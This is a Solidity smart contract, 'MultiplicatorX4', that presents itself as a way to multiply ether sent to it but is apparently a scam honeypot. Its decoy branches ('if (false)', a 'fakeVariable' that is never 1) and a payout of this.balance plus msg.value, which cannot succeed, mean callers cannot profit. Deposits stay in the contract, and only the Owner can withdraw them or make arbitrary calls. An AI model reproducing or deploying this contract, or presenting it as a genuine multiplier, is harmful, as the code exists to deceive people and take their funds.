pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;
   
    function() public payable{
        if (false) { revert(); }
    }
   
    function withdraw()
    payable
    public
    {
        if (true) {
            if(msg.sender == Owner) {
                Owner.transfer(this.balance);
            } else {
                revert();
            }
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        if (msg.value > 0) {
            require(msg.sender == Owner);
            adr.call.value(msg.value)(data);
        } else {
            if (false) { revert(); }
        }
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        uint256 fakeVariable = 0;
        if(msg.value >= this.balance) {
            if (fakeVariable == 1) {
                adr.transfer(1);
            } else {
                adr.transfer(this.balance + msg.value);
            }
        }
    }
}